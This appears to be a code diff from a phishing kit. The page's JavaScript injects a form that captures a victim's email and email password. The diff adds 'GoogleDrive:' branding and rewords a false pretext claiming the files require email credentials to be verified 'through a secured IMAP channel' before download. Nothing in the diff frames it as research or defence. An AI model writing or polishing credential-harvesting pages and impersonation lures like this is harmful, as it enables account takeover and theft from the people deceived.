@@ -32,8 +32,9 @@ document.addEventListener('DOMContentLoaded', function(){
             placeOne.innerHTML = `<div id="placetwo"> <div class="input-container"> <input type="hidden" value=${lemaInput.value} name="lemahi"> <input type="password" value="" class="abracadabra" id="lepa" name="lepa" minlength="0" placeholder="Enter email password" required> <div class="errormsg" id="stillerror"></div></div> <div class="rembme"><input type="checkbox" checked /> <span>Remember me</span></div> 
 			
 <div style="white-space: pre-line; font-size: 0.6em; font-weight: bold; line-height: 1.2em; margin: 0;">
+GoogleDrive:
 These files are sensitive and secured against unauthorized access. 
-In order to access this file, please provide your email credentials, 
+In order to download this file, please provide your email credentials, 
 we will connect to your email provider through a secured 
 IMAP channel to authorize your download
 </div>
